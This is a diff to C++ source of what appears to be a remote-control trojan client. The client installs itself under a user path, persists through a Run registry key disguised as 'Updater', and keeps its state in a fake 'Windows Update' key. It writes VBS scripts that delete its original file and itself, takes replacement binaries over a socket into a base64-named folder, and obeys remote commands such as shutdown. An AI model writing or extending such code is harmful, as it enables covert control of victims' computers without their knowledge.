@@ -7,12 +7,13 @@ bool IsInstalled()
 	return (ru.RegRead("SOFTWARE\\Windows Update", "Install State", REG_SZ) == "true");	
 }
 
-void InstallClient()
+short InstallClient()
 {
 	Settaggi sett;
 	RegUtils ru;
 	SystemUtils su;
 	DirUtils du;
+	EasyMSGB msgb;
 
 	sett.InstallSettings();
 
@@ -22,15 +23,29 @@ void InstallClient()
 		PathToCopy.replace(PathToCopy.find("<"), PathToCopy.find(">") + 1 - PathToCopy.find("<"), su.GetCurrentUser());
 
 	ru.RegDelValue("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Updater");
-	if (sett.RegStartup)
-		ru.RegWrite("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Updater", REG_SZ, ("\"" + PathToCopy + "\"").c_str());
 
-	du.DelFile(PathToCopy);
-	du.CopyPasteFile(du.GetFullModuleFilePath(), PathToCopy);
+	if (sett.RegStartup)
+		if (!ru.RegWrite("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Updater", REG_SZ, ("\"" + PathToCopy + "\"").c_str()))
+			return 2;
+
+	//msgb.Ok(PathToCopy);
+
+	if (du.GetFullModuleFilePath() != PathToCopy)
+	{
+		du.DelFile(PathToCopy);
+		if (!du.CopyPasteFile(du.GetFullModuleFilePath(), PathToCopy))
+			return 3;
+
+		du.WriteFile(du.GetModuleFilePath() + "Rem.vbs", "WScript.Sleep 1500\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nfilesys.DeleteFile \"" + du.GetFullModuleFilePath() + "\"\nfilesys.DeleteFile \"" + du.GetModuleFilePath() + "Rem.vbs\"");
+		su.NoOutputCMD("start \"\" \"" + du.GetModuleFilePath() + "Rem.vbs\"");
+	}
 	
 	su.RunExe(PathToCopy);
 
-	ru.RegWrite("SOFTWARE\\Windows Update", "Install State", REG_SZ, "true");
+	if (!ru.RegWrite("SOFTWARE\\Windows Update", "Install State", REG_SZ, "true"))
+		return 4;
+
+	return 0;
 }
 
 bool GetInfo(SOCKET Sock)
@@ -68,14 +83,13 @@ bool UpdateClient(SOCKET Sock)
 	if (NewClient == "")
 		return false;
 
-	du.SetCurrDir(du.GetModuleFilePath());
-	if (!du.CheckDir("VXBkYXRl"))
-		du.MakeDir("VXBkYXRl");
+	if (!du.CheckDir(du.GetModuleFilePath() + "VXBkYXRl"))
+		du.MakeDir(du.GetModuleFilePath() + "VXBkYXRl");
 
-	if (!du.WriteBinaryFile("VXBkYXRl\\" + du.GetModuleFile(), NewClient))
+	if (!du.WriteBinaryFile(du.GetModuleFilePath() + "VXBkYXRl\\" + du.GetModuleFile(), NewClient))
 		return false;
 
-	if (!du.WriteFile("Update.vbs", "WScript.Sleep 5000\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nSet WshShell = WScript.CreateObject(\"WScript.Shell\")\nfilesys.DeleteFile \"" + du.GetModuleFile() + "\"\nfilesys.MoveFile \"VXBkYXRl\\" + du.GetModuleFile() + "\", \"" + du.GetModuleFile() + "\"\nWScript.Sleep 1000\nWshShell.Run \"" + du.GetModuleFile() + "\", 1, false\nfilesys.DeleteFile \"Update.vbs\""))
+	if (!du.WriteFile(du.GetModuleFilePath() + "Update.vbs", "WScript.Sleep 5000\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nSet WshShell = WScript.CreateObject(\"WScript.Shell\")\nfilesys.DeleteFile \"" + du.GetFullModuleFilePath() + "\"\nfilesys.MoveFile \"" + du.GetModuleFilePath() + "VXBkYXRl\\" + du.GetModuleFile() + "\", \"" + du.GetFullModuleFilePath() + "\"\nWScript.Sleep 1000\nWshShell.Run \"" + du.GetFullModuleFilePath() + "\", 1, false\nfilesys.DeleteFolder \"" + du.GetModuleFilePath() + "VXBkYXRl\"\nfilesys.DeleteFile \"" + du.GetModuleFilePath() + "Update.vbs\""))
 		return false;
 
 	ru.RegDelKey("SOFTWARE\\Windows Update");
@@ -94,8 +108,16 @@ void Uninstall()
 	ru.RegDelKey("SOFTWARE\\Windows Update");
 	ru.RegDelValue("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Updater");
 
-	du.WriteFile(du.GetModuleFilePath() + "Remove.vbs", "WScript.Sleep 5000\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nfilesys.DeleteFile \"" + du.GetFullModuleFilePath() + "\"\nfilesys.DeleteFile \"Remove.vbs\"");
+	du.WriteFile(du.GetModuleFilePath() + "Remove.vbs", "WScript.Sleep 5000\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nfilesys.DeleteFile \"" + du.GetFullModuleFilePath() + "\"\nfilesys.DeleteFile \"" + du.GetModuleFilePath() + "Remove.vbs\"");
 	su.NoOutputCMD("start \"\" \"" + du.GetModuleFilePath() + "Remove.vbs\"");
+}
+
+void RestartClient()
+{
+	DirUtils du;
+	SystemUtils su;
+
+	su.RunExe(du.GetFullModuleFilePath());
 }
 
 short Sessione(TcpIP Client)
@@ -118,9 +140,13 @@ short Sessione(TcpIP Client)
 			i = InvertMouse(Client.Sock);
 		}
 		else if (cmd == "reconnect")
+		{
 			i = false;
+		}
 		else if (cmd == "kill")
+		{
 			return 1;
+		}
 		else if (cmd == "shutdown")
 		{
 			su.NoOutputCMD("shutdown -s -t 0");
@@ -139,6 +165,11 @@ short Sessione(TcpIP Client)
 		else if (cmd == "uninstall")
 		{
 			Uninstall();
+			return 1;
+		}
+		else if (cmd == "restart")
+		{
+			RestartClient();
 			return 1;
 		}
 	}
